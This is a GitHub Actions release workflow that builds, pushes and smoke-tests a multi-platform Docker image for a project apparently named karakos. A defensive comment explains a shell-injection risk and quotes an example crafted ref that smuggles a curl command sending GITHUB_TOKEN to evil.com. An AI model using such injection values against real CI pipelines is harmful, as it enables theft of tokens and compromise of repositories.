name: Release

on:
  push:
    tags: ["v*"]
  workflow_dispatch:
    inputs:
      ref:
        description: "Tag or commit SHA to build (defaults to current ref)"
        required: false

permissions:
  contents: read
  packages: write

jobs:
  build-push:
    runs-on: ubuntu-latest
    outputs:
      image_digest: ${{ steps.build.outputs.digest }}
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          ref: ${{ inputs.ref || github.ref }}

      - name: Resolve image version
        id: version
        env:
          # Interpolate user-controlled inputs.ref into an env var rather than
          # the script body. Direct ${{ }} interpolation in `run:` is a known
          # GitHub Actions shell-injection antipattern: a crafted ref like
          # `v1.0" ] && curl evil.com/?t=$GITHUB_TOKEN && [ "x` would execute
          # arbitrary commands in the runner. github.event_name and
          # github.ref_name are GitHub-controlled and safe to interpolate.
          INPUT_REF: ${{ inputs.ref }}
        run: |
          # For workflow_dispatch with an explicit ref input, use it as the
          # version source so metadata-action computes semver tags correctly.
          # For tag-triggered runs, github.ref_name already holds the tag (e.g. v1.3).
          if [ "${{ github.event_name }}" = "workflow_dispatch" ] && [ -n "$INPUT_REF" ]; then
            VALUE="$INPUT_REF"
          else
            VALUE="${{ github.ref_name }}"
          fi

          # Guard: must be a semver tag (vX.Y or vX.Y.Z). Without this, dispatching
          # with ref=main (or any non-semver) silently produces no semver tags from
          # metadata-action, and the image is pushed only as :latest, overwriting
          # the current latest with an unversioned build.
          if ! echo "$VALUE" | grep -qE '^v[0-9]+\.[0-9]+(\.[0-9]+)?$'; then
            echo "::error::ref must be a semver tag like v1.3 or v1.3.1 (got: $VALUE)"
            exit 1
          fi

          echo "value=$VALUE" >> $GITHUB_OUTPUT

      - name: Set up QEMU
        uses: docker/setup-qemu-action@v3

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Log in to GHCR
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Extract metadata
        id: meta
        uses: docker/metadata-action@v5
        with:
          images: ghcr.io/mcarmody/karakos
          tags: |
            type=semver,pattern=v{{major}}.{{minor}},value=${{ steps.version.outputs.value }}
            type=semver,pattern=v{{major}},value=${{ steps.version.outputs.value }}
            type=raw,value=latest

      - name: Build and push
        id: build
        uses: docker/build-push-action@v5
        with:
          context: .
          platforms: linux/amd64,linux/arm64
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

  smoke-pull:
    needs: build-push
    runs-on: ubuntu-latest
    strategy:
      matrix:
        platform: [linux/amd64, linux/arm64]
    steps:
      - name: Set up QEMU
        uses: docker/setup-qemu-action@v3

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Log in to GHCR
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Pull and smoke test (${{ matrix.platform }})
        run: |
          # Pull the freshly-published image by digest to ensure we test the
          # artifact we just pushed, not a cached layer from a previous release.
          IMAGE="ghcr.io/mcarmody/karakos@${{ needs.build-push.outputs.image_digest }}"
          docker pull --platform ${{ matrix.platform }} "$IMAGE"

          # Verify dashboard was built into the image
          docker run --rm --platform ${{ matrix.platform }} --entrypoint test \
            "$IMAGE" -d /workspace/dashboard/.next

          # Verify Python dependencies are importable
          docker run --rm --platform ${{ matrix.platform }} --entrypoint python3 \
            "$IMAGE" -c "import aiohttp, aiosqlite, discord; print('ok')"

          # Verify Node.js is present (used by Claude CLI)
          docker run --rm --platform ${{ matrix.platform }} --entrypoint node \
            "$IMAGE" --version
